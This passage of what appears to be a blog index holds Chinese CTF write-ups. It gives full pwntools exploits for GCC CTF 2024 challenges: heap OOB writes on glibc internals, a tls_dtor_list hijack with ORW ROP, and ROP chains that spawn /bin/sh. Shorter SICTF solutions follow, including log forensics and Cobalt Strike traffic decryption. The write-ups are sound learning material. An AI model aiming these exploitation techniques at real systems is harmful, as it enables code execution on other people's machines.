加上刚释放的块的大小    char * ptr2 = malloc(0x21000);    printf(\"%p\\n\",ptr2);    return 0;}  第一次申请 0x21000,  trim_threshold​ 是 0x20000​​  然后释放, 可以看到 释放 mmap 分配的chunk 时，它会更改  mp_.mmap_threshold​ ，使它变得更大if (!mp_.no_dyn_threshold // 默认是 0， 如果我们把它改成1 是不是就不会执行到 改mp_.trim_threshold 的语句了          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)        {          mp_.mmap_threshold = chunksize (p);          mp_.trim_threshold = 2 * mp_.mmap_threshold; // 这里 mmap_threshold = 0x22000          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,                      mp_.mmap_threshold, mp_.trim_threshold);        }​​​​pwndbg&gt; p mp_$4 = {  trim_threshold = 278528,  top_pad = 131072,  mmap_threshold = 139264,  arena_test = 8,  arena_max = 0,  thp_pagesize = 0,  hp_pagesize = 0,  hp_flags = 0,  n_mmaps = 0,  n_mmaps_max = 65536,  max_n_mmaps = 1,  no_dyn_threshold = 0,  mmapped_mem = 0,  max_mmapped_mem = 139264,  sbrk_base = 0x555555559000 \"\",  tcache_bins = 64,  tcache_max_bytes = 1032,  tcache_count = 7,  tcache_unsorted_limit = 0}  再次申请 0x21000 返回的地址 就是 heap 上的了​​‍分析攻击思路‍  首先申请一个big chunk (0x2000), malloc 会使用 mmap 来分配内存位置（tls 附近），每次申请完地址，我们可以改一个字节，利用 OOB 修改 mp_.no_dyn_threshold​​ 的值 不为空。  这样的话 free 时，就不会 执行到 mp_.trim_threshold = 2 * mp_.mmap_threshold;​​ 避免被更改‍‍exploit-change-mp_.no_dyn_threshold  ​mp_.no_dyn_threshold​ 还是比较好定位的（题目之给了 libc ld binary, 缺少一些符号表）add(0x21000,2065304,1) ​​  修改后​​‍  接下来再 free ，然后再申请基本上不会再报错了‍exploit-libc_leak      利用 OOB 修改 _IO2_1_stdout_._IO_write_ptr​ 的指向地址        只要 _IO_write_base​​ 和 _IO_write_ptr​​ 有差距就会输出_IO_write_base​​ 到 _IO_write_ptr​​ 直接的数据  from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './flag_roulette'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x1709b * __call_tls_dtors#continue'''.format(**locals())io = start(binary)def rol(num,i):    part1 = num &lt;&lt; i    part1 &amp;= (1 &lt;&lt; 64) - 1    part2 = num &gt;&gt; (64- i)    return part1 + part2def add(size,idx,data):    ru('&gt; ')    sl('1')    ru(\"How many bytes would you like to bet on ?\\n&gt; \")    sl(str(size)) # 0x7f ~ 0x21000    ru('Please choose the index of the byte to modify\\n&gt; ')    sl(str(idx))    ru('Please set the new value of this byte\\n&gt; ')    sl(str(data))def rm():    ru('&gt; ')    sl('2')# OOBdef write_b(offset,b):    add(0x21000,offset,b)    rm()def write_Q(addr,c):    global heap_ptr    offset = addr - heap_ptr    data = p64(c)    for i in range(8):        print(offset+i,data[i])        write_b(offset+i,data[i])# 修改 mp_.no_dyn_thresholdwrite_b(0x1f8398, 1)'''libc leak'''# 修改 _IO_write_ptradd(0x21000,0x1f9798, 0x20)ru('\\x00'*4)libc_base = uu64(r(6)) - 1923632tls_base  = libc_base - 10432heap_ptr = libc_base - 0x24ff0lss('libc_base')lss('tls_base')itr()  没修改前​​‍  修改后 _IO_write_ptr​ 大于 _IO_write_base​ 所以可以泄露 它们之间的数据包含一个 libc 上的地址​​‍​​‍exploit-Attack tls_dtor_list‍......# OOBwrite_b(0x1f8398, 1)'''libc leak'''add(0x21000,0x1f9798, 0x20)ru('\\x00'*4)libc_base = uu64(r(6)) - 1923632tls_base  = libc_base - 10432heap_ptr = libc_base - 0x24ff0rm()# tls_base + 0x30write_Q(tls_base+0x30,0x00)write_Q(tls_base-0x50, tls_base-0x48)write_Q(tls_base-0x48, rol(0x41424344,0x11))write_Q(tls_base-0x40, 0x44454647)add(0x21000,1,1)lss('libc_base')lss('tls_base')gdb.attach(io,gdbscript)ru('&gt; ')sl('3')itr()  观察 修改后 的tls附近的数据​​  现在已经可以控制执行流了，但是由于存在 seccomp​ 沙箱，不能使用 system​ execve​  只能通过 ORW 去读取flag 文件，还需要一个 gadget ~​​‍exploit-need_a_gadget‍  由于只能 通过ORW 的方式去读取flag, 只能 call​ 一个地址显然不能满足我们现在的需求  这里我们就需要使用栈迁移来帮助我们 进行 ROP ，还需要一个 gadget​​可以控制某些寄存器中的附近值raxrbx rdxrsir14r15  使用 ropper 工具，我们希望 可以控制 rbp 然后进行 leave​ . (如果你使用 ROPgadget可能就找不到这些gadget)‍​​➜  2024_gccctf_Flag_Roulette ropper(ropper)&gt; file ./libc.so.6[INFO] Load gadgets from cache[LOAD] loading... 100%[LOAD] removing double gadgets... 100%[INFO] File loaded.(libc.so.6/ELF/x86_64)&gt; search mov rbp[INFO] Searching for gadgets: mov rbp                                                                                                                                                                                                                 [INFO] File: ./libc.so.60x00000000000fd4a1: mov rbp, 0xffffffffffffffff; pop rbx; mov rax, rbp; pop rbp; pop r12; ret;0x00000000001644d2: mov rbp, cr6; out dx, eax; lea rax, [rdi + rcx + 0x20]; ret;0x00000000000fd45b: mov rbp, qword ptr [r12]; mov rax, rbp; pop rbx; pop rbp; pop r12; ret;0x0000000000093804: mov rbp, qword ptr [r8 + 8]; mov rdi, r8; mov rbx, qword ptr [r8]; call 0x263a0; mov rdi, rbp; call rbx;0x0000000000145e36: mov rbp, qword ptr [rdi + 0x48]; mov rax, qword ptr [rbp + 0x18]; lea r13, [rbp + 0x10]; mov dword ptr [rbp + 0x10], 0; mov rdi, r13; call qword ptr [rax + 0x28];0x0000000000099ab4: mov rbp, qword ptr [rsi + 8]; mov rax, qword ptr [rbx + 0x40]; test byte ptr [rbx + 0x50], 1; jne 0x99a98; mov rdi, rsi; call rax;0x0000000000143473: mov rbp, qword ptr [rsp + 0x30]; mov rsi, rbx; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x10];0x000000000007eb00: mov rbp, r12; pop rbx; mov rax, rbp; pop rbp; pop r12; ret;0x000000000003c33b: mov rbp, r9; jmp rdx;0x000000000007eaef: mov rbp, rax; mov rax, rbp; pop rbp; pop r12; ret;0x0000000000108448: mov rbp, rcx; push rbx; mov rbx, rdi; mov rdi, rcx; sub rsp, 8; call rsi;0x0000000000074042: mov rbp, rdx; mov rdi, qword ptr [rdi + 0xe0]; call rax;  选择使用这个 0x0000000000099ab4，后面的call rax 肯就需要是leave; ret  0x0000000000099ab4: mov rbp, qword ptr [rsi + 8]; mov rax, qword ptr [rbx + 0x40]; test byte ptr [rbx + 0x50], 1; jne 0x99a98; mov rdi, rsi; call rax;‍exploit  最终from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './flag_roulette'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''#brva 0x1709b * __call_tls_dtors#continue'''.format(**locals())io = start(binary)def rol(num,i):    part1 = num &lt;&lt; i    part1 &amp;= (1 &lt;&lt; 64) - 1    part2 = num &gt;&gt; (64- i)    return part1 + part2def add(size,idx,data):    ru('&gt; ')    sl('1')    ru(\"How many bytes would you like to bet on ?\\n&gt; \")    sl(str(size)) # 0x7f ~ 0x21000    ru('Please choose the index of the byte to modify\\n&gt; ')    sl(str(idx))    ru('Please set the new value of this byte\\n&gt; ')    sl(str(data))def rm():    ru('&gt; ')    sl('2')def write_b(offset,b):    add(0x21000,offset,b)    rm()def write_Q(addr,c):    global heap_ptr    offset = addr - heap_ptr    data = p64(c)    for i in range(8):        print(offset+i,data[i])        write_b(offset+i,data[i])# OOBwrite_b(0x1f8398, 1)'''libc leak'''add(0x21000,0x1f9798, 0x20)ru('\\x00'*4)libc_base = uu64(r(6)) - 1923632tls_base  = libc_base - 10432heap_ptr = libc_base - 0x24ff0rm()magic_gadget = libc_base + 0x0000000000099ab4# rop base = tls_base + 0x60rsi = libc_base + 1914944 + 8rbp = tls_base + 0x60write_Q(rsi,rbp)# col raxrbx = tls_base - 0x48 + 0x40rax = libc_base + 0x000000000004e3b9 # leave; ret;write_Q(rbx,rax)rop_base = tls_base + 0x68libc.address = libc_baserop = ROP(libc)rax = rop.find_gadget(['pop rax','ret'])[0]rdi = rop.find_gadget(['pop rdi','ret'])[0]rsi = rop.find_gadget(['pop rsi','ret'])[0]rdx = rop.find_gadget(['pop rdx','ret'])[0]syscall = rop.find_gadget(['syscall','ret'])[0]read_rop =[    rax, 0,    rdi, 0,    rsi, rop_base+0x48,    rdx, 0x400,    syscall]for i in range(len(read_rop)):    write_Q(rop_base+(i*8),read_rop[i])# clear random valueswrite_Q(tls_base+0x30,0x00)write_Q(tls_base-0x50, tls_base-0x48)write_Q(tls_base-0x48, rol(magic_gadget,0x11))write_Q(tls_base-0x40, 0x44454647)lss('libc_base')lss('tls_base')#gdb.attach(io,gdbscript)add(0x21000,1,1)ru('&gt; ')sl('3')pause()orw_rop_addr = rop_base+0x48orw_rop  = p64(rax) + p64(2) + p64(rdi) + p64(orw_rop_addr+0xb8) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)orw_rop += p64(rdi) + p64(3) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(rdx) + p64(0x100) + p64(libc.sym['read'])orw_rop += p64(rdi) + p64(1) + p64(rsi) + p64(orw_rop_addr+0xb8) + p64(rdx) + p64(0x100) + p64(libc.sym['write'])orw_rop += b'/flag'.ljust(0x10,b'\\x00')sl(orw_rop)itr()  调试‍​call rax​​​  执行 magic gadget部分已经成功修改 rax 和 rbp ,​​‍  然后 call rax ,执行 leave 进行栈迁移​​​​‍执行一个 read，把ORW 操作部分的 rop 读到当前栈上​​‍  ORW 部分​​​​‍至此结束，总之学到了不少东西，一开始不会，跟着大佬的wp solve  mp_ 结构体的一些作用，一些关于malloc 和 free 的部分知识  一些ROPgadget 找不到，而 ropper 可以找到的gadget‍END  参考大佬的博客地址https://chovid99.github.io/posts/gcc-ctf-2024/🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎🧎‍‍  下面俩题 没啥可看的‍Cuttin_String这题不是很难所以就随便写写  源码BITS 64; -------------------------------------------------------; STATIC VARIABLESsection .rdata; //// [Banner messages] ////main_message db 10,\"Cuttin'String, the smallest string cutting tool\",10,\"-----------------------------------------------\",10, 0len_str_message db \"Enter the length of the string (in decimal) &gt; \", 0inp_str_message db \"Enter the string to cut &gt; \", 0delimiter_message db 10,10,\"---\",10,0; //// [Error messages] ////error_msg_not_int db \"Error. Enter a number in decimal.\",10,0; -------------------------------------------------------; ASM CODE :)section .textglobal _start; //// [Utils] ////; @Type: Macro; Prepare sys_read syscall__LOAD_SYS_READ:\txor rax, rax\tret; @Type: Macro; Prepare sys_write syscall__LOAD_SYS_WRITE:\txor rax, rax\tmov rdi, 1\tinc al\tret; @Type: Function; @Quick: _PUTS(str*, len=0); @Desc: Print the given string in stdout; \t\t If len is not 0, display len bytes of str; \t\t Else, it continues until reaching a null-byte_PUTS:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Get the arguments\tmov rsi, [rsp+24] ; ptr*\tmov rdx, [rsp+16] ; len\t; Check if len parameter is passed\ttest rdx, rdx\tjne skip_determine_lenfind_null_byte_index:\tmov al, rsi[rdx]\tinc rdx\tcmp al, 0\tjne find_null_byte_indexskip_determine_len:\t; PRINT the string\tcall __LOAD_SYS_WRITE\tdec rdx\tsyscall\tleave\tret; @Type: Function; @Quick: _read_and_print_str(len); @Desc: Read str from stdin and print the len first bytes to stdout_read_and_print_str:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Get len argument\tmov r10, [rsp+16] ; len\t; Allocate stack buffer of 512 bytes\tsub rsp, 512\t; Read 0x512 bytes from stdin\tcall __LOAD_SYS_READ\txor rdi, rdi\tmov rsi, rsp\tmov rdx, 0x512\tsyscall\t; Print the string cutted\tpush rsi ; Str\tpush r10 ; len\tcall _PUTS\tadd rsp, 8\t; Return from function\tleave\tret; @Type: Function; @Quick: _get_len_str(void) -&gt; len:r10; @Desc: Reads decimal from stdin and convert it to usable number._get_len_str:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Allocate 8 bytes buffer\tsub rsp, 8\t; Read 8 bytes from stdin\tcall __LOAD_SYS_READ\txor rdi, rdi\tmov rsi, rsp\tmov rdx, 8\tsyscall\t; Prepare str to int\txor r10, r10\t; Reset output\txor rcx, rcx \t; Reset counter\t; Perform str to int by looping through each digitloop_over_digits:\txor rax, rax \t; Reset local output\tmov al, rsp[rcx] ; Read read char from str\t; IF char == null_byte\tcmp al, 0\tje end_loop_number\t; IF char == new_line\tcmp al, 10\tje end_loop_number\t; IF char &lt; \"0\"\tcmp al, '0'\tjb _error_not_int\t; IF char &gt; \"9\"\tcmp al, '9'\tja _error_not_int\t; IF its the units digit, dont multiply by ten before adding\ttest rcx, rcx\tje skip_mul\t; Multiply the result by ten\timul r10, r10, 10skip_mul:\t; Digit ascii value to actual value\tsub rax, '0'\t; Add digit to result\tadd r10, rax\t; Continue looping through the digits until reaching the end\tinc rcx\tcmp rcx, 8\tjne loop_over_digitsend_loop_number:\t; Clean 8 bytes buffer\tadd rsp, 8\t; Clean stackframe and return\tleave\tret; @Type: Function; @Quick: _main_loop(void); @Desc: Perform all the program operations_main_loop:\t; Setup stack frame\tpush rbp\tmov rbp, rsp\t; Display the length input message\tlea rax,[rel len_str_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\t; Read length from stdin in decimal\tcall _get_len_str\t; Add 1 to result because of later calculations\tadd r10, 1\t; Display the string input message\tlea rax,[rel inp_str_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\t; Read str from stdin and print it\tpush r10\tcall _read_and_print_str\tadd rsp, 8\t; Display the delimiter\tlea rax,[rel delimiter_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\tleave\tret; //// [Program] ////_start:\t; Display banner message\tlea rax,[rel main_message]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 16\tmov rbp, rsp__main_loop:\tcall _main_loop\tjmp __main_loop; //// [Error Handlers] ////; @Type: ERROR_HANDLER; @Quick: _error_not_int(void); @Raise_condition: When converting str to int, if a character is not a digit._error_not_int:\t; PUTS error_msg_not_int\tlea rax,[rel error_msg_not_int]\tpush rax\tpush 0\tcall _PUTS\tadd rsp, 8\t; SYS_EXIT(0)\txor edi, edi\tmov rax, 0x3c\tsyscall‍#!/bin/bashnasm -f ELF64 -o chall.o chall.asmgcc -z noexecstack -o chall chall.o -nostdlibrm chall.o‍没有 引用libc.so, 可以在 stack 泄露 ld.so 的地址 然后从ld.so 上 找 gadget​ 打 ，然后栈溢出打ROP‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './chall'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''#continue'''.format(**locals())io = start(binary)ru('(in decimal) &gt; ')sl('2222222')ru('the string to cut &gt; ')sl(b'\\x00A')r(8)ld_base = uu64(r(8)) - 228016r(8)stack = uu64(r(8))ru('(in decimal) &gt; ')sl('2222222')rax_rdx_rbx_ret = ld_base + 0x000000000001ee12 # pop rax ; pop rdx ; pop rbx ; retrsi_ret         = ld_base + 0x000000000000469a # pop rsi ; retrdi_ret         = ld_base + 0x0000000000003b63 # pop rdi ; retsyscall         = ld_base + 0x000000000000b708 # syscallpay = flat([    rax_rdx_rbx_ret,0x3b,0,0,    rdi_ret, stack-208,    rsi_ret, 0,    syscall    ])ru('the string to cut &gt; ')gdb.attach(io)sl(b'/bin/sh'.ljust(0x100,b'\\x00')+0x108*b'A' + pay)#gdb.attach(io,gdbscript)lss('ld_base')lss('stack')itr()‍Baby_bof  高版本 glibc 攻击 tls_dtor_list​,  main​ 函数正常 return 退出，或者 执行 exit();​ 都会触发这个  正常情况下 tls_dtor_list​ 是空值.（类似一个hook 函数）​​  程序漏洞，简单解释​​‍  可以利用 printf 泄露 地址，然后泄露 Canary​（需要覆盖部分canary然后泄露它下面的 一个随机值，main return 时候会检测）  很简单，可以参考 高版本tls_dtor_list的利用。‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)rl      = lambda                    :io.recvline()itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = './baby_bof'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''brva 0x002BCBb *__call_tls_dtors#continue'''.format(**locals())io = start(binary)def sp(pay):    ru('&gt; ')    sl('1')    ru('&gt; ')    s(pay)def s_exit():    ru('&gt; ')    sl('2')pay = b'A' * 0x68sp(pay)ru(pay)tls_base    = uu64(r(6)) - 3229322 - 198libc_base   = tls_base + 5248system  = libc_base + libc.sym['system']bin_sh  = libc_base + next(libc.search(b'/bin/sh'))pay = 0xbf8 * b'C' + b'\\n'sp(pay)ru(pay)canary = uu64(r(7)) &lt;&lt; 8rand   = uu64(r(8))def rol(num,i):    part1 = num &lt;&lt; i    part1 &amp;= (1 &lt;&lt; 64) - 1    part2 = num &gt;&gt; (64 - i)    return part1 + part2# 0xbd0#&gt;&gt;&gt; hex(0xffffffffffffff90 - (1 &lt;&lt; 64))# '-0x70'pay = 0xa * p64(canary)pay = pay.ljust(0xbd0-0x70,b'\\x00')pay += p64(tls_base-0x70+8)pay += p64(rol(system,0x11))pay += p64(bin_sh)pay  = pay.ljust(0xbd0+0x10,b'\\x00') # mov rax,qword ptr fs:[0x10]pay += p64(tls_base) #pay  = pay.ljust(0xbd0+0x30+8,b'\\x00')sp(pay)lss('tls_base')lss('libc_base')lss('canary')lss('rand')#gdb.attach(io,gdbscript)s_exit()itr()‍​​​​‍‍"
  },
  
  {
    "title": "2024-SICTF Round#3-WriteUps_by_AhiSec",
    "url": "/posts/SICTF-Round-3-WriteUps_by_AhiSec/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2024-02-16 18:42:08 +0800",
    





    
    "snippet": "  感谢队友带我飞.ReverseBaby_C++‍1.签到题 shift + F12直接看见flag​​‍Ez_pyc‍1.在线网址反编译不全，发现是3.8的python版本，直接使用3.8的uncompyle6反编译出源码​​2.一个数独游戏可以求解不过观察判断条件，发现如果数独正确输出的flag是正确flag的md5后的值提交一下发现flag就是那个md5 ​​‍ArtBreaker‍...",
    "content": "  感谢队友带我飞.ReverseBaby_C++‍1.签到题 shift + F12直接看见flag​​‍Ez_pyc‍1.在线网址反编译不全，发现是3.8的python版本，直接使用3.8的uncompyle6反编译出源码​​2.一个数独游戏可以求解不过观察判断条件，发现如果数独正确输出的flag是正确flag的md5后的值提交一下发现flag就是那个md5 ​​‍ArtBreaker‍  比较抽象IDA打开发现节点过多修改节点个数限制，发现flag在流程图里面​​‍‍SweetTofu‍  简单的签到，主函数就是用户输入并且判断输入的长度是否大于0x100,调用v1这个函数指针加密直接打断点运行到v1指向的函数​​2.发现就是一个异或0x66而已​​3.解密得到flag​​‍Battle City‍  坦克大战通关后会生成一个win.png的二维码扫码得到flag​​​​‍‍(🩸)[进阶]CloseMe‍首先翻到下面发现有一个xor，解密一下看看得到一段hint​​​​  ++v64 == 16也就是说需要按16次​​判断按的是否为 0 1​​3.根据调试的结果这个代码就是将输入的 0 1倒叙后将输入的01当作整数，例如输入: 1011 将会变成 1101注意是整数 1101而不是二进制转十进制​​4.调试发现将输入的后两位截取​​截取前14位和后2位拼接，相当于把最后两位放到前面来了​​  sub_7FF7845EAEC0函数实际执行的代码其实就只有这一段，这一段的作用是将变换后的01转为整数也就是二进制转十进制，return前 « 16​​​​  Check代码判断二进制转十进制再左移16后是不是0xA9F10000，确定这个为check的原因是如果不为0xA9F10000则会跳转到那个弹窗口的分支中​​7.也就是说正确的输入变化后的十进制为0xA9F1，将0xA9F1交换后再倒叙得到flag​​‍‍Misc‍(🩸)真签到‍1.压缩包要密码爆破不开，将压缩包拖入16进制编辑器发现HEX值解密得到一串看似BASE32的字符串但是其实是字母加密，字母加密的特点就是加密后的字母很重复，解密得到压缩包密码 2024HappyNewYear​​​​​​2.打开音频文件，查看频谱图记得缩小一下发现一段字符根据jpg图片的文件名猜测是steghide隐写这个是key不过发现不对​​  查看音频文件的文件名 Lagrange is Capatlized提示Lagrange 是大写的​​​​4.解密得到flag​​‍‍‍‍问卷调查‍‍‍‍  ??????‍签到签到‍  扫描微信公众号回复”SICTF{Round3，我来辣~}”获取flag‍GeekChallege‍from pwn import *sl      = lambda data               :io.sendline(data)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)context.log_level = 'debug'io = remote('yuanshen.life',33312)ru('Tip:len(array)=5&amp;&amp;len(passwd)=114')pwd = ''n = 1s = []#s = 'DDD_J_JDL__DLJDDa'# DDD_J_JDL__DLJDDa_a_aD_JLJJa_JJJk000000000000000000000000000000000000000000000000000000000000000000000000000000000\\nfor i in range(120):    for i in range(32,127):        ru('&gt;')        p = pwd + chr(i)        p = p.ljust(114,'0')        sl(p)        t = io.recvline().decode()        print(t)        if n * '1' in t:            pwd += chr(i)            n += 1            if chr(i) not in s:                s.append(chr(i))            break    if len(s) == 5:        break        print(pwd)for i in range(120):    for i in s:        ru('&gt;')        p = pwd + i        p = p.ljust(114,'0')        sl(p)        t = io.recvline().decode()        print(t)        if n * '1' in t:            pwd += i            n += 1            break        print(pwd)io.interactive()‍​​‍‍(🩸🩸)日志分析1我是先找的计划任务直接过滤4698​​注意名称不能有斜杠            callback      C:\\windows\\system32\\windows_attack.exe      这两个答案就找到了‍然后就是黑客创建的用户名过滤4720​​attack$‍接着是黑客添加的用户组过滤4732​​Administrators‍然后就是黑客接入的ip地址这个需要通过一个工具LogParser.exe过滤登陆成功的事件 LogParser.exe -i:EVT \"SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,8,'|') as EventType,EXTRACT_TOKEN(Strings,5,'|') as username,EXTRACT_TOKEN(Strings,18,'|') as LoginipFROM 1.evtx where EventID=4624\"​​192.168.222.200‍最后就是远程登陆用户根据题目的提示​​​​最后的flag​​‍‍日志分析2使用脚本解码一下from urllib.parse import unquotef = open('access.log.1','r').readlines()f1 = open('1.log','a')for i in f:    dd = i.strip()    text = unquote(dd, 'utf-8')    f1.write(text+\"\\n\")在最后一行，我们就可以发现 webshell连接工具的名称和版本号，以及黑客的IP地址​​看最上面发现有大量的请求发往login​​再根据给的提示，四字攻击手法，很明显就是暴力破解沿着这个爆破的请求翻就可以发现下面的sql注入​​最后flag是：            SICTF{10.11.35.95      暴力破解      sqlmap      1.2.4.18      蚁剑      2.1}      ‍‍WHO?WHO?WHO压缩包密码需要爆破​​​​解压得到以下内容​​零宽直接在线网站解​​U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+/0J16ELU8WVQydohw4P5+2MjbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL/WP4PCMaOJHAW3HRb7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE=rabbit解密钥为shumu​​GTAGAGCTAGTCCTT{GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT}百度一搜​​说是DNA序列，接着toolsFX工具解​​注意一下下划线的位置就行了SICTF{Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN}‍‍‍神秘的流量‍  数据包可以得到这个压缩包​​‍  用到的工具 脚本https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.pyhttps://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py  解密cs流量  使用 cs-extract-key.py​ 工具 可以得到 AES key : HMAC key​python3 cs-extract-key.py -c 000001b01c14d0909382a212e81996ca13bcbcfc9e6396b054f7663e440053e18cf02547016dc37d5f82ea562b8e24d6e69ce890f34dc45f64d3dcd5cb2e5bce3e34d17b4ebd4890a69463ca8c92db79a52f21f8844084eb41aa70fa1b8d047537ba1c898a6437d57b43d99b97bad26c31c0d4f67b768663a459cef8e70d1f1b5ae1656de024c6a0ec66b8d2eb22817451c1a9f924e876b290cbd4b6e0fcc2170bf45b906904b4b0f8ff305064c844308a90d44da3f612b00bdb18c5ad5f1a8f300dc348e0f7aa98c4579dfa297a52b01f1f12709df4939b72e46ce81747e99003d63232e93a0d7397474175a20100d5daaf1c63840c8ce465afeba65d2fc2f43223cf1108bcf09d6daa0096b62c9c89542c257afa98179cbbcbd6729694fbd738cd840bb9efa6ac5e42a89749577efddea42af24abdd3f6af3e001143d2d9995b8dedb3914db8dc00fbf5623116f489164f94b995a995de8a6ded650808c4382247ea5261edb700afb6850280fb45edbbec053f9507faa739b69efd281183127115861bd5ce038244a57047368f72d7c35fd05b2e0381b62b41a7f89f4c948c9b3b987421f2ace96e4d9a362b66c5dc1acd2403 dmp.dmp​​‍  然后用 cs-parse-http-traffic.py​ 就可以拿到明文# AES key position: 0x003662d8# AES Key:  e453d7f06b53a1638b0087236bae5d3b# HMAC key position: 0x003695f8# HMAC Key: 2bfb11c55658a2050e501c3571ebe676python3 cs-parse-http-traffic.py -k 2bfb11c55658a2050e501c3571ebe676:e453d7f06b53a1638b0087236bae5d3b  21.pcapng -e​​​​‍SICTF{b50936c7-b60d-411e-a91f-304937164b9c}‍                    参考 [从pcap包中解密cobalt-strike流量        fdvoid0's blog (fdlucifer.github.io)](https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/)            ‍‍(🩸🩸)New Year’ s regret‍  根据题目提示掩码爆破出压缩包密码​​  output.txt一堆0 1猜测是0 1转图片在压缩包最底下有一段hex值，直接转不行需要将hex值倒叙一下得到宽高写脚本得到一张图片​​​​​​3.乐谱密码解密得到一部分呢flag​​​​4.HXD打开图片发现有一个压缩包，分离一下发现一段BASE64脚本解密最后转图片二维码扫码得到一部分flag​​​​​​​​  还有一张图片根据题目提示猜测是武器星级，图片识别发现是战双帕弥什的武器根据图鉴写下星级https://wiki.biligame.com/zspms/%E6%AD%A6%E5%99%A8​​HEX解码发现不对，观察数字只有 4 5 6猜测是摩斯密码， 4 –》.  5 -》空格 